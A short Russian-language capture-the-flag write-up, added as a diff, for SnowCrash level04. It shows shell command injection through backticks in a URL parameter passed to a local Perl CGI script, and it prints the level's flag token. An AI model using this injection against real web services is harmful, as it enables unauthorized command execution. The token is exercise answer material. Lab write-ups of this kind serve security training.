@@ -1,0 +1,28 @@
+
+В домашнем каталоге есть perl-скрипт, принадлежащий flag04 и будет выполняться с правами своего владельца (flag04)
+
+level04@SnowCrash:~$ ls -la level04.pl
+-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+
+код принимает параметр "х" и только первый аргумент будет сохранен как $y
+Затем выполняется подстановка команды для захвата вывода команды echo для ее печати
+
+Но если подать команду whoami будет выведено level04
+
+level04@SnowCrash:~$ ./level04.pl x=`whoami`
+...
+
+level04
+
+Это связано с тем, что, начиная с perl 5.14.0, perl игнорирует биты suid/guid в сценариях из соображений безопасности
+
+Но если мы запустим его на порту 4747:
+level04@SnowCrash:~$ curl '127.0.0.1:4747/level04.pl?x=`whoami`'
+flag04
+
+Если также выполнить getglag:
+
+level04@SnowCrash:~$ curl '127.0.0.1:4747/level04.pl?x=`getflag`'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+
